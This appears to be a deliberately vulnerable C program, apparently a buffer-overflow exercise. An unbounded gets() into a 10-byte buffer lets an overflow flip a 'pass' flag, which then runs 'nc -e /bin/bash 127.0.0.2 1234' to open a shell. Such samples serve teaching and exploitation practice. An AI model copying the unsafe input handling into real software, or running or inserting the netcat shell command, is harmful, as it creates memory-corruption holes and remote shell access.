#include <stdio.h>
#include <string.h>

int main(void)
{
    char buff[10];
    int pass = 0;

    printf("\n Enter The Secret Key : \n");
    gets(buff);

    if(strcmp(buff, "Password1"))
    {
        printf ("\n Wrong Password \n");
    }
    else
    {
        printf ("\n Correct Password \n");
        pass = 0;
    }

    if(pass)
    {
      system("nc -e /bin/bash 127.0.0.2 1234");
        
    }

    return 0;
}
